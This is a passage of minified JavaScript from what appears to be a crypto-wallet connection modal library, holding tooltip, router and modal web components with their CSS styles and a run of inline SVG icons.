    background-color: var(--wui-color-fg-100);
    border: none;
  }

  wui-icon {
    position: absolute;
    width: 12px !important;
    height: 4px !important;
    color: var(--wui-color-bg-150);
  }

  wui-icon[data-placement='top'] {
    bottom: 0px;
    left: 50%;
    transform: translate(-50%, 95%);
  }

  wui-icon[data-placement='bottom'] {
    top: 0;
    left: 50%;
    transform: translate(-50%, -95%) rotate(180deg);
  }

  wui-icon[data-placement='right'] {
    top: 50%;
    left: 0;
    transform: translate(-65%, -50%) rotate(90deg);
  }

  wui-icon[data-placement='left'] {
    top: 50%;
    right: 0%;
    transform: translate(65%, -50%) rotate(270deg);
  }
`,ed=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let pa=class extends fe{constructor(){super(),this.unsubscribe=[],this.open=Al.state.open,this.message=Al.state.message,this.triggerRect=Al.state.triggerRect,this.variant=Al.state.variant,this.unsubscribe.push(Al.subscribe(t=>{this.open=t.open,this.message=t.message,this.triggerRect=t.triggerRect,this.variant=t.variant}))}disconnectedCallback(){this.unsubscribe.forEach(t=>t())}render(){this.dataset.variant=this.variant;const t=this.triggerRect.top,e=this.triggerRect.left;return this.style.cssText=`
    --w3m-tooltip-top: ${t}px;
    --w3m-tooltip-left: ${e}px;
    --w3m-tooltip-parent-width: ${this.triggerRect.width/2}px;
    --w3m-tooltip-display: ${this.open?"flex":"none"};
    --w3m-tooltip-opacity: ${this.open?1:0};
    `,U`<wui-flex>
      <wui-icon data-placement="top" color="fg-100" size="inherit" name="cursor"></wui-icon>
      <wui-text color="inherit" variant="small-500">${this.message}</wui-text>
    </wui-flex>`}};pa.styles=[NZ],ed([le()],pa.prototype,"open",void 0),ed([le()],pa.prototype,"message",void 0),ed([le()],pa.prototype,"triggerRect",void 0),ed([le()],pa.prototype,"variant",void 0),pa=ed([he("w3m-tooltip"),he("w3m-tooltip")],pa);var PZ=Ae`
  :host {
    --prev-height: 0px;
    --new-height: 0px;
    display: block;
  }

  div.w3m-router-container {
    transform: translateY(0);
    opacity: 1;
  }

  div.w3m-router-container[view-direction='prev'] {
    animation:
      slide-left-out 150ms forwards ease,
      slide-left-in 150ms forwards ease;
    animation-delay: 0ms, 200ms;
  }

  div.w3m-router-container[view-direction='next'] {
    animation:
      slide-right-out 150ms forwards ease,
      slide-right-in 150ms forwards ease;
    animation-delay: 0ms, 200ms;
  }

  @keyframes slide-left-out {
    from {
      transform: translateX(0px);
      opacity: 1;
    }
    to {
      transform: translateX(10px);
      opacity: 0;
    }
  }

  @keyframes slide-left-in {
    from {
      transform: translateX(-10px);
      opacity: 0;
    }
    to {
      transform: translateX(0);
      opacity: 1;
    }
  }

  @keyframes slide-right-out {
    from {
      transform: translateX(0px);
      opacity: 1;
    }
    to {
      transform: translateX(-10px);
      opacity: 0;
    }
  }

  @keyframes slide-right-in {
    from {
      transform: translateX(10px);
      opacity: 0;
    }
    to {
      transform: translateX(0);
      opacity: 1;
    }
  }
`,ym=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let td=class extends fe{constructor(){super(),this.resizeObserver=void 0,this.prevHeight="0px",this.prevHistoryLength=1,this.unsubscribe=[],this.view=se.state.view,this.viewDirection="",this.unsubscribe.push(se.subscribeKey("view",t=>this.onViewChange(t)))}firstUpdated(){var t;this.resizeObserver=new ResizeObserver(([e])=>{const r=`${e==null?void 0:e.contentRect.height}px`;this.prevHeight!=="0px"&&(this.style.setProperty("--prev-height",this.prevHeight),this.style.setProperty("--new-height",r),this.style.animation="w3m-view-height 150ms forwards ease",this.style.height="auto"),setTimeout(()=>{this.prevHeight=r,this.style.animation="unset"},Do.ANIMATION_DURATIONS.ModalHeight)}),(t=this.resizeObserver)==null||t.observe(this.getWrapper())}disconnectedCallback(){var t;(t=this.resizeObserver)==null||t.unobserve(this.getWrapper()),this.unsubscribe.forEach(e=>e())}render(){return U`<div class="w3m-router-container" view-direction="${this.viewDirection}">
      ${this.viewTemplate()}
    </div>`}viewTemplate(){switch(this.view){case"AccountSettings":return U`<w3m-account-settings-view></w3m-account-settings-view>`;case"Account":return U`<w3m-account-view></w3m-account-view>`;case"AllWallets":return U`<w3m-all-wallets-view></w3m-all-wallets-view>`;case"ApproveTransaction":return U`<w3m-approve-transaction-view></w3m-approve-transaction-view>`;case"BuyInProgress":return U`<w3m-buy-in-progress-view></w3m-buy-in-progress-view>`;case"ChooseAccountName":return U`<w3m-choose-account-name-view></w3m-choose-account-name-view>`;case"Connect":return U`<w3m-connect-view></w3m-connect-view>`;case"Create":return U`<w3m-connect-view walletGuide="explore"></w3m-connect-view>`;case"ConnectingWalletConnect":return U`<w3m-connecting-wc-view></w3m-connecting-wc-view>`;case"ConnectingWalletConnectBasic":return U`<w3m-connecting-wc-basic-view></w3m-connecting-wc-basic-view>`;case"ConnectingExternal":return U`<w3m-connecting-external-view></w3m-connecting-external-view>`;case"ConnectingSiwe":return U`<w3m-connecting-siwe-view></w3m-connecting-siwe-view>`;case"ConnectWallets":return U`<w3m-connect-wallets-view></w3m-connect-wallets-view>`;case"ConnectSocials":return U`<w3m-connect-socials-view></w3m-connect-socials-view>`;case"ConnectingSocial":return U`<w3m-connecting-social-view></w3m-connecting-social-view>`;case"Downloads":return U`<w3m-downloads-view></w3m-downloads-view>`;case"EmailLogin":return U`<w3m-email-login-view></w3m-email-login-view>`;case"EmailVerifyOtp":return U`<w3m-email-verify-otp-view></w3m-email-verify-otp-view>`;case"EmailVerifyDevice":return U`<w3m-email-verify-device-view></w3m-email-verify-device-view>`;case"GetWallet":return U`<w3m-get-wallet-view></w3m-get-wallet-view>`;case"Networks":return U`<w3m-networks-view></w3m-networks-view>`;case"SwitchNetwork":return U`<w3m-network-switch-view></w3m-network-switch-view>`;case"Profile":return U`<w3m-profile-view></w3m-profile-view>`;case"SwitchAddress":return U`<w3m-switch-address-view></w3m-switch-address-view>`;case"Transactions":return U`<w3m-transactions-view></w3m-transactions-view>`;case"OnRampProviders":return U`<w3m-onramp-providers-view></w3m-onramp-providers-view>`;case"OnRampActivity":return U`<w3m-onramp-activity-view></w3m-onramp-activity-view>`;case"OnRampTokenSelect":return U`<w3m-onramp-token-select-view></w3m-onramp-token-select-view>`;case"OnRampFiatSelect":return U`<w3m-onramp-fiat-select-view></w3m-onramp-fiat-select-view>`;case"UpgradeEmailWallet":return U`<w3m-upgrade-wallet-view></w3m-upgrade-wallet-view>`;case"UpdateEmailWallet":return U`<w3m-update-email-wallet-view></w3m-update-email-wallet-view>`;case"UpdateEmailPrimaryOtp":return U`<w3m-update-email-primary-otp-view></w3m-update-email-primary-otp-view>`;case"UpdateEmailSecondaryOtp":return U`<w3m-update-email-secondary-otp-view></w3m-update-email-secondary-otp-view>`;case"UnsupportedChain":return U`<w3m-unsupported-chain-view></w3m-unsupported-chain-view>`;case"Swap":return U`<w3m-swap-view></w3m-swap-view>`;case"SwapSelectToken":return U`<w3m-swap-select-token-view></w3m-swap-select-token-view>`;case"SwapPreview":return U`<w3m-swap-preview-view></w3m-swap-preview-view>`;case"WalletSend":return U`<w3m-wallet-send-view></w3m-wallet-send-view>`;case"WalletSendSelectToken":return U`<w3m-wallet-send-select-token-view></w3m-wallet-send-select-token-view>`;case"WalletSendPreview":return U`<w3m-wallet-send-preview-view></w3m-wallet-send-preview-view>`;case"WhatIsABuy":return U`<w3m-what-is-a-buy-view></w3m-what-is-a-buy-view>`;case"WalletReceive":return U`<w3m-wallet-receive-view></w3m-wallet-receive-view>`;case"WalletCompatibleNetworks":return U`<w3m-wallet-compatible-networks-view></w3m-wallet-compatible-networks-view>`;case"WhatIsAWallet":return U`<w3m-what-is-a-wallet-view></w3m-what-is-a-wallet-view>`;case"ConnectingMultiChain":return U`<w3m-connecting-multi-chain-view></w3m-connecting-multi-chain-view>`;case"WhatIsANetwork":return U`<w3m-what-is-a-network-view></w3m-what-is-a-network-view>`;case"ConnectingFarcaster":return U`<w3m-connecting-farcaster-view></w3m-connecting-farcaster-view>`;case"SwitchActiveChain":return U`<w3m-switch-active-chain-view></w3m-switch-active-chain-view>`;case"RegisterAccountName":return U`<w3m-register-account-name-view></w3m-register-account-name-view>`;case"RegisterAccountNameSuccess":return U`<w3m-register-account-name-success-view></w3m-register-account-name-success-view>`;case"SmartSessionCreated":return U`<w3m-smart-session-created-view></w3m-smart-session-created-view>`;case"SmartSessionList":return U`<w3m-smart-session-list-view></w3m-smart-session-list-view>`;case"SIWXSignMessage":return U`<w3m-siwx-sign-message-view></w3m-siwx-sign-message-view>`;default:return U`<w3m-connect-view></w3m-connect-view>`}}onViewChange(t){Al.hide();let e=Do.VIEW_DIRECTION.Next;const{history:r}=se.state;r.length<this.prevHistoryLength&&(e=Do.VIEW_DIRECTION.Prev),this.prevHistoryLength=r.length,this.viewDirection=e,setTimeout(()=>{this.view=t},Do.ANIMATION_DURATIONS.ViewTransition)}getWrapper(){var t;return(t=this.shadowRoot)==null?void 0:t.querySelector("div")}};td.styles=PZ,ym([le()],td.prototype,"view",void 0),ym([le()],td.prototype,"viewDirection",void 0),td=ym([he("w3m-router")],td);var kZ=Ae`
  :host {
    z-index: var(--w3m-z-index);
    display: block;
    backface-visibility: hidden;
    will-change: opacity;
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    pointer-events: none;
    opacity: 0;
    background-color: var(--wui-cover);
    transition: opacity 0.2s var(--wui-ease-out-power-2);
    will-change: opacity;
  }

  :host(.open) {
    opacity: 1;
  }

  :host(.embedded) {
    position: relative;
    pointer-events: unset;
    background: none;
    width: 100%;
    opacity: 1;
  }

  wui-card {
    max-width: var(--w3m-modal-width);
    width: 100%;
    position: relative;
    animation: zoom-in 0.2s var(--wui-ease-out-power-2);
    animation-fill-mode: backwards;
    outline: none;
    transition:
      border-radius var(--wui-duration-lg) var(--wui-ease-out-power-1),
      background-color var(--wui-duration-lg) var(--wui-ease-out-power-1);
    will-change: border-radius, background-color;
  }

  :host(.embedded) wui-card {
    max-width: 400px;
  }

  wui-card[shake='true'] {
    animation:
      zoom-in 0.2s var(--wui-ease-out-power-2),
      w3m-shake 0.5s var(--wui-ease-out-power-2);
  }

  wui-flex {
    overflow-x: hidden;
    overflow-y: auto;
    display: flex;
    align-items: center;
    justify-content: center;
    width: 100%;
    height: 100%;
  }

  @media (max-height: 700px) and (min-width: 431px) {
    wui-flex {
      align-items: flex-start;
    }

    wui-card {
      margin: var(--wui-spacing-xxl) 0px;
    }
  }

  @media (max-width: 430px) {
    wui-flex {
      align-items: flex-end;
    }

    wui-card {
      max-width: 100%;
      border-bottom-left-radius: var(--local-border-bottom-mobile-radius);
      border-bottom-right-radius: var(--local-border-bottom-mobile-radius);
      border-bottom: none;
      animation: slide-in 0.2s var(--wui-ease-out-power-2);
    }

    wui-card[shake='true'] {
      animation:
        slide-in 0.2s var(--wui-ease-out-power-2),
        w3m-shake 0.5s var(--wui-ease-out-power-2);
    }
  }

  @keyframes zoom-in {
    0% {
      transform: scale(0.95) translateY(0);
    }
    100% {
      transform: scale(1) translateY(0);
    }
  }

  @keyframes slide-in {
    0% {
      transform: scale(1) translateY(50px);
    }
    100% {
      transform: scale(1) translateY(0);
    }
  }

  @keyframes w3m-shake {
    0% {
      transform: scale(1) rotate(0deg);
    }
    20% {
      transform: scale(1) rotate(-1deg);
    }
    40% {
      transform: scale(1) rotate(1.5deg);
    }
    60% {
      transform: scale(1) rotate(-1.5deg);
    }
    80% {
      transform: scale(1) rotate(1deg);
    }
    100% {
      transform: scale(1) rotate(0deg);
    }
  }

  @keyframes w3m-view-height {
    from {
      height: var(--prev-height);
    }
    to {
      height: var(--new-height);
    }
  }
`,ga=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};const $8="scroll-lock";let Pi=class extends fe{constructor(){super(),this.unsubscribe=[],this.abortController=void 0,this.hasPrefetched=!1,this.enableEmbedded=Y.state.enableEmbedded,this.open=qe.state.open,this.caipAddress=B.state.activeCaipAddress,this.caipNetwork=B.state.activeCaipNetwork,this.shake=qe.state.shake,this.filterByNamespace=ae.state.filterByNamespace,this.initializeTheming(),oe.prefetchAnalyticsConfig(),this.unsubscribe.push(qe.subscribeKey("open",t=>t?this.onOpen():this.onClose()),qe.subscribeKey("shake",t=>this.shake=t),B.subscribeKey("activeCaipNetwork",t=>this.onNewNetwork(t)),B.subscribeKey("activeCaipAddress",t=>this.onNewAddress(t)),Y.subscribeKey("enableEmbedded",t=>this.enableEmbedded=t),ae.subscribeKey("filterByNamespace",t=>{var e;this.filterByNamespace!==t&&!((e=B.getAccountData(t))!=null&&e.caipAddress)&&(oe.fetchRecommendedWallets(),this.filterByNamespace=t)}))}firstUpdated(){if(this.caipAddress){if(this.enableEmbedded){qe.close(),this.prefetch();return}this.onNewAddress(this.caipAddress)}this.open&&this.onOpen(),this.enableEmbedded&&this.prefetch()}disconnectedCallback(){this.unsubscribe.forEach(t=>t()),this.onRemoveKeyboardListener()}render(){return this.style.cssText=`
      --local-border-bottom-mobile-radius: ${this.enableEmbedded?"clamp(0px, var(--wui-border-radius-l), 44px)":"0px"};
    `,this.enableEmbedded?U`${this.contentTemplate()}
        <w3m-tooltip></w3m-tooltip> `:this.open?U`
          <wui-flex @click=${this.onOverlayClick.bind(this)} data-testid="w3m-modal-overlay">
            ${this.contentTemplate()}
          </wui-flex>
          <w3m-tooltip></w3m-tooltip>
        `:null}contentTemplate(){return U` <wui-card
      shake="${this.shake}"
      data-embedded="${Ee(this.enableEmbedded)}"
      role="alertdialog"
      aria-modal="true"
      tabindex="0"
      data-testid="w3m-modal-card"
    >
      <w3m-header></w3m-header>
      <w3m-router></w3m-router>
      <w3m-snackbar></w3m-snackbar>
      <w3m-alertbar></w3m-alertbar>
    </wui-card>`}async onOverlayClick(t){t.target===t.currentTarget&&await this.handleClose()}async handleClose(){se.state.view==="UnsupportedChain"||await Uo.isSIWXCloseDisabled()?qe.shake():qe.close()}initializeTheming(){const{themeVariables:t,themeMode:e}=Bt.state,r=Wt.getColorTheme(e);LW(t,r)}onClose(){this.open=!1,this.classList.remove("open"),this.onScrollUnlock(),ut.hide(),this.onRemoveKeyboardListener()}onOpen(){this.open=!0,this.classList.add("open"),this.onScrollLock(),this.onAddKeyboardListener()}onScrollLock(){const t=document.createElement("style");t.dataset.w3m=$8,t.textContent=`
      body {
        touch-action: none;
        overflow: hidden;
        overscroll-behavior: contain;
      }
      w3m-modal {
        pointer-events: auto;
      }
    `,document.head.appendChild(t)}onScrollUnlock(){const t=document.head.querySelector(`style[data-w3m="${$8}"]`);t&&t.remove()}onAddKeyboardListener(){var e;this.abortController=new AbortController;const t=(e=this.shadowRoot)==null?void 0:e.querySelector("wui-card");t==null||t.focus(),window.addEventListener("keydown",r=>{if(r.key==="Escape")this.handleClose();else if(r.key==="Tab"){const{tagName:n}=r.target;n&&!n.includes("W3M-")&&!n.includes("WUI-")&&(t==null||t.focus())}},this.abortController)}onRemoveKeyboardListener(){var t;(t=this.abortController)==null||t.abort(),this.abortController=void 0}async onNewAddress(t){const e=B.state.isSwitchingNamespace,r=te.getPlainAddress(t);!r&&!e?qe.close():e&&r&&se.goBack(),await Uo.initializeIfEnabled(),this.caipAddress=t,B.setIsSwitchingNamespace(!1)}onNewNetwork(t){var g,p;const e=this.caipNetwork,r=(g=e==null?void 0:e.caipNetworkId)==null?void 0:g.toString(),n=e==null?void 0:e.chainNamespace,i=(p=t==null?void 0:t.caipNetworkId)==null?void 0:p.toString(),s=t==null?void 0:t.chainNamespace,o=r!==i,a=o&&n===s,c=(e==null?void 0:e.name)===ve.UNSUPPORTED_NETWORK_NAME,l=se.state.view==="ConnectingExternal",u=!this.caipAddress,h=se.state.view==="UnsupportedChain",d=qe.state.open;let f=!1;d&&!l&&(u?o&&(f=!0):(h||a&&!c)&&(f=!0)),f&&se.state.view!=="SIWXSignMessage"&&se.goBack(),this.caipNetwork=t}prefetch(){this.hasPrefetched||(oe.prefetch(),oe.fetchWalletsByPage({page:1}),this.hasPrefetched=!0)}};Pi.styles=kZ,ga([F({type:Boolean})],Pi.prototype,"enableEmbedded",void 0),ga([le()],Pi.prototype,"open",void 0),ga([le()],Pi.prototype,"caipAddress",void 0),ga([le()],Pi.prototype,"caipNetwork",void 0),ga([le()],Pi.prototype,"shake",void 0),ga([le()],Pi.prototype,"filterByNamespace",void 0),Pi=ga([he("w3m-modal")],Pi);var OZ=Object.freeze({__proto__:null,get W3mModal(){return Pi}});const _Z=re`<svg
  width="14"
  height="14"
  viewBox="0 0 14 14"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    fill="currentColor"
    fill-rule="evenodd"
    clip-rule="evenodd"
    d="M7.0023 0.875C7.48571 0.875 7.8776 1.26675 7.8776 1.75V6.125H12.2541C12.7375 6.125 13.1294 6.51675 13.1294 7C13.1294 7.48325 12.7375 7.875 12.2541 7.875H7.8776V12.25C7.8776 12.7332 7.48571 13.125 7.0023 13.125C6.51889 13.125 6.12701 12.7332 6.12701 12.25V7.875H1.75054C1.26713 7.875 0.875244 7.48325 0.875244 7C0.875244 6.51675 1.26713 6.125 1.75054 6.125H6.12701V1.75C6.12701 1.26675 6.51889 0.875 7.0023 0.875Z"
    fill="#667dff"
  /></svg
>`;var TZ=Object.freeze({__proto__:null,addSvg:_Z});const $Z=re`<svg fill="none" viewBox="0 0 24 24">
  <path
    style="fill: var(--wui-color-accent-100);"
    d="M10.2 6.6a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0ZM21 6.6a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0ZM10.2 17.4a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0ZM21 17.4a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0Z"
  />
</svg>`;var RZ=Object.freeze({__proto__:null,allWalletsSvg:$Z});const DZ=re`<svg
  fill="none"
  viewBox="0 0 21 20"
>
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M10.5 2.42908C6.31875 2.42908 2.92859 5.81989 2.92859 10.0034C2.92859 14.1869 6.31875 17.5777 10.5 17.5777C14.6813 17.5777 18.0714 14.1869 18.0714 10.0034C18.0714 5.81989 14.6813 2.42908 10.5 2.42908ZM0.928589 10.0034C0.928589 4.71596 5.21355 0.429077 10.5 0.429077C15.7865 0.429077 20.0714 4.71596 20.0714 10.0034C20.0714 15.2908 15.7865 19.5777 10.5 19.5777C5.21355 19.5777 0.928589 15.2908 0.928589 10.0034ZM10.5 5.75003C11.0523 5.75003 11.5 6.19774 11.5 6.75003L11.5 10.8343L12.7929 9.54137C13.1834 9.15085 13.8166 9.15085 14.2071 9.54137C14.5976 9.9319 14.5976 10.5651 14.2071 10.9556L11.2071 13.9556C10.8166 14.3461 10.1834 14.3461 9.79291 13.9556L6.79291 10.9556C6.40239 10.5651 6.40239 9.9319 6.79291 9.54137C7.18343 9.15085 7.8166 9.15085 8.20712 9.54137L9.50002 10.8343L9.50002 6.75003C9.50002 6.19774 9.94773 5.75003 10.5 5.75003Z"
    clip-rule="evenodd"
  /></svg
>`;var BZ=Object.freeze({__proto__:null,arrowBottomCircleSvg:DZ});const LZ=re`
<svg width="36" height="36">
  <path
    d="M28.724 0H7.271A7.269 7.269 0 0 0 0 7.272v21.46A7.268 7.268 0 0 0 7.271 36H28.73A7.272 7.272 0 0 0 36 28.728V7.272A7.275 7.275 0 0 0 28.724 0Z"
    fill="url(#a)"
  />
  <path
    d="m17.845 8.271.729-1.26a1.64 1.64 0 1 1 2.843 1.638l-7.023 12.159h5.08c1.646 0 2.569 1.935 1.853 3.276H6.434a1.632 1.632 0 0 1-1.638-1.638c0-.909.73-1.638 1.638-1.638h4.176l5.345-9.265-1.67-2.898a1.642 1.642 0 0 1 2.844-1.638l.716 1.264Zm-6.317 17.5-1.575 2.732a1.64 1.64 0 1 1-2.844-1.638l1.17-2.025c1.323-.41 2.398-.095 3.249.931Zm13.56-4.954h4.262c.909 0 1.638.729 1.638 1.638 0 .909-.73 1.638-1.638 1.638h-2.367l1.597 2.772c.45.788.185 1.782-.602 2.241a1.642 1.642 0 0 1-2.241-.603c-2.69-4.666-4.711-8.159-6.052-10.485-1.372-2.367-.391-4.743.576-5.549 1.075 1.846 2.682 4.631 4.828 8.348Z"
    fill="#fff"
  />
  <defs>
    <linearGradient id="a" x1="18" y1="0" x2="18" y2="36" gradientUnits="userSpaceOnUse">
      <stop stop-color="#18BFFB" />
      <stop offset="1" stop-color="#2072F3" />
    </linearGradient>
  </defs>
</svg>`;var UZ=Object.freeze({__proto__:null,appStoreSvg:LZ});const MZ=re`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#000" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M28.77 23.3c-.69 1.99-2.75 5.52-4.87 5.56-1.4.03-1.86-.84-3.46-.84-1.61 0-2.12.81-3.45.86-2.25.1-5.72-5.1-5.72-9.62 0-4.15 2.9-6.2 5.42-6.25 1.36-.02 2.64.92 3.47.92.83 0 2.38-1.13 4.02-.97.68.03 2.6.28 3.84 2.08-3.27 2.14-2.76 6.61.75 8.25ZM24.2 7.88c-2.47.1-4.49 2.69-4.2 4.84 2.28.17 4.47-2.39 4.2-4.84Z"
        />
      </g>
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`;var FZ=Object.freeze({__proto__:null,appleSvg:MZ});const zZ=re`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M7 1.99a1 1 0 0 1 1 1v7.58l2.46-2.46a1 1 0 0 1 1.41 1.42L7.7 13.69a1 1 0 0 1-1.41 0L2.12 9.53A1 1 0 0 1 3.54 8.1L6 10.57V3a1 1 0 0 1 1-1Z"
    clip-rule="evenodd"
  />
</svg>`;var jZ=Object.freeze({__proto__:null,arrowBottomSvg:zZ});const HZ=re`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M13 7.99a1 1 0 0 1-1 1H4.4l2.46 2.46a1 1 0 1 1-1.41 1.41L1.29 8.7a1 1 0 0 1 0-1.41L5.46 3.1a1 1 0 0 1 1.41 1.42L4.41 6.99H12a1 1 0 0 1 1 1Z"
    clip-rule="evenodd"
  />
</svg>`;var qZ=Object.freeze({__proto__:null,arrowLeftSvg:HZ});const VZ=re`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M1 7.99a1 1 0 0 1 1-1h7.58L7.12 4.53A1 1 0 1 1 8.54 3.1l4.16 4.17a1 1 0 0 1 0 1.41l-4.16 4.17a1 1 0 1 1-1.42-1.41l2.46-2.46H2a1 1 0 0 1-1-1Z"
    clip-rule="evenodd"
  />
</svg>`;var WZ=Object.freeze({__proto__:null,arrowRightSvg:VZ});const GZ=re`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M7 13.99a1 1 0 0 1-1-1V5.4L3.54 7.86a1 1 0 0 1-1.42-1.41L6.3 2.28a1 1 0 0 1 1.41 0l4.17 4.17a1 1 0 1 1-1.41 1.41L8 5.4v7.59a1 1 0 0 1-1 1Z"
    clip-rule="evenodd"
  />
</svg>`;var KZ=Object.freeze({__proto__:null,arrowTopSvg:GZ});const ZZ=re`<svg
  xmlns="http://www.w3.org/2000/svg"
  width="12"
  height="13"
  viewBox="0 0 12 13"
  fill="none"
>
  <path
    fill-rule="evenodd"
    clip-rule="evenodd"
    d="M5.61391 1.57124C5.85142 1.42873 6.14813 1.42873 6.38564 1.57124L11.0793 4.38749C11.9179 4.89067 11.5612 6.17864 10.5832 6.17864H9.96398V10.0358H10.2854C10.6996 10.0358 11.0354 10.3716 11.0354 10.7858C11.0354 11.2 10.6996 11.5358 10.2854 11.5358H1.71416C1.29995 11.5358 0.964172 11.2 0.964172 10.7858C0.964172 10.3716 1.29995 10.0358 1.71416 10.0358H2.03558L2.03558 6.17864H1.41637C0.438389 6.17864 0.0816547 4.89066 0.920263 4.38749L5.61391 1.57124ZM3.53554 6.17864V10.0358H5.24979V6.17864H3.53554ZM6.74976 6.17864V10.0358H8.46401V6.17864H6.74976ZM8.64913 4.67864H3.35043L5.99978 3.089L8.64913 4.67864Z"
    fill="currentColor"
  /></svg
>`;var JZ=Object.freeze({__proto__:null,bankSvg:ZZ});const QZ=re`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M4 6.4a1 1 0 0 1-.46.89 6.98 6.98 0 0 0 .38 6.18A7 7 0 0 0 16.46 7.3a1 1 0 0 1-.47-.92 7 7 0 0 0-12 .03Zm-2.02-.5a9 9 0 1 1 16.03 8.2A9 9 0 0 1 1.98 5.9Z"
    clip-rule="evenodd"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M6.03 8.63c-1.46-.3-2.72-.75-3.6-1.35l-.02-.01-.14-.11a1 1 0 0 1 1.2-1.6l.1.08c.6.4 1.52.74 2.69 1 .16-.99.39-1.88.67-2.65.3-.79.68-1.5 1.15-2.02A2.58 2.58 0 0 1 9.99 1c.8 0 1.45.44 1.92.97.47.52.84 1.23 1.14 2.02.29.77.52 1.66.68 2.64a8 8 0 0 0 2.7-1l.26-.18h.48a1 1 0 0 1 .12 2c-.86.51-2.01.91-3.34 1.18a22.24 22.24 0 0 1-.03 3.19c1.45.29 2.7.73 3.58 1.31a1 1 0 0 1-1.1 1.68c-.6-.4-1.56-.76-2.75-1-.15.8-.36 1.55-.6 2.2-.3.79-.67 1.5-1.14 2.02-.47.53-1.12.97-1.92.97-.8 0-1.45-.44-1.91-.97a6.51 6.51 0 0 1-1.15-2.02c-.24-.65-.44-1.4-.6-2.2-1.18.24-2.13.6-2.73.99a1 1 0 1 1-1.1-1.67c.88-.58 2.12-1.03 3.57-1.31a22.03 22.03 0 0 1-.04-3.2Zm2.2-1.7c.15-.86.34-1.61.58-2.24.24-.65.51-1.12.76-1.4.25-.28.4-.29.42-.29.03 0 .17.01.42.3.25.27.52.74.77 1.4.23.62.43 1.37.57 2.22a19.96 19.96 0 0 1-3.52 0Zm-.18 4.6a20.1 20.1 0 0 1-.03-2.62 21.95 21.95 0 0 0 3.94 0 20.4 20.4 0 0 1-.03 2.63 21.97 21.97 0 0 0-3.88 0Zm.27 2c.13.66.3 1.26.49 1.78.24.65.51 1.12.76 1.4.25.28.4.29.42.29.03 0 .17-.01.42-.3.25-.27.52-.74.77-1.4.19-.5.36-1.1.49-1.78a20.03 20.03 0 0 0-3.35 0Z"
    clip-rule="evenodd"
  />
</svg>`;var YZ=Object.freeze({__proto__:null,browserSvg:QZ});const XZ=re`<svg
  xmlns="http://www.w3.org/2000/svg"
  width="12"
  height="13"
  viewBox="0 0 12 13"
  fill="none"
>
  <path
    fill-rule="evenodd"
    clip-rule="evenodd"
    d="M4.16072 2C4.17367 2 4.18665 2 4.19968 2L7.83857 2C8.36772 1.99998 8.82398 1.99996 9.19518 2.04018C9.5895 2.0829 9.97577 2.17811 10.3221 2.42971C10.5131 2.56849 10.6811 2.73647 10.8198 2.92749C11.0714 3.27379 11.1666 3.66007 11.2094 4.0544C11.2496 4.42561 11.2496 4.88188 11.2495 5.41105V7.58896C11.2496 8.11812 11.2496 8.57439 11.2094 8.94561C11.1666 9.33994 11.0714 9.72621 10.8198 10.0725C10.6811 10.2635 10.5131 10.4315 10.3221 10.5703C9.97577 10.8219 9.5895 10.9171 9.19518 10.9598C8.82398 11 8.36772 11 7.83856 11H4.16073C3.63157 11 3.17531 11 2.80411 10.9598C2.40979 10.9171 2.02352 10.8219 1.67722 10.5703C1.48621 10.4315 1.31824 10.2635 1.17946 10.0725C0.927858 9.72621 0.832652 9.33994 0.78993 8.94561C0.749713 8.5744 0.749733 8.11813 0.749757 7.58896L0.749758 5.45C0.749758 5.43697 0.749758 5.42399 0.749757 5.41104C0.749733 4.88188 0.749713 4.42561 0.78993 4.0544C0.832652 3.66007 0.927858 3.27379 1.17946 2.92749C1.31824 2.73647 1.48621 2.56849 1.67722 2.42971C2.02352 2.17811 2.40979 2.0829 2.80411 2.04018C3.17531 1.99996 3.63157 1.99998 4.16072 2ZM2.96567 3.53145C2.69897 3.56034 2.60687 3.60837 2.55888 3.64324C2.49521 3.6895 2.43922 3.74549 2.39296 3.80916C2.35809 3.85715 2.31007 3.94926 2.28117 4.21597C2.26629 4.35335 2.25844 4.51311 2.25431 4.70832H9.74498C9.74085 4.51311 9.733 4.35335 9.71812 4.21597C9.68922 3.94926 9.6412 3.85715 9.60633 3.80916C9.56007 3.74549 9.50408 3.6895 